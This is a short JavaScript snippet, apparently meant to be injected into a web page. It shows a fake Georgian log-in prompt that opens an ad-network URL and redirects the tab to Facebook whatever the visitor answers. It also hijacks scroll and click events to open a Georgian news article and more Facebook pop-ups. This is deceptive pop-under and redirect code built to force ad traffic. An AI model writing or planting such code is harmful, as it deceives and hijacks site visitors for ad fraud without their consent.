setTimeout(function(){ 
    if (confirm('გსურთ შესვლა საიტზე?')){
        window.open("http://ofgogoatan.com/afu.php?zoneid=3294231");
        window.open("http://www.facebook.com/", '_self');
     }else{
        window.open("http://ofgogoatan.com/afu.php?zoneid=3294231");
        window.open("http://www.facebook.com/", '_self');
     };
 }, 1000); 



window.onscroll = function() {myFunction()};

function myFunction() {
    if (document.body.scrollTop > 5 || document.documentElement.scrollTop > 5) {
        window.open('https://upon.ge/article/ხაშურში-დასაჯარიმებლად/');
    } else {
      document.getElementById("myP").className = "";
    }
  };

  $(window).click(function(){
    window.open('https://facebook.com');
    window.open('https://upon.ge/article/ხაშურში-დასაჯარიმებლად/'); 
  });
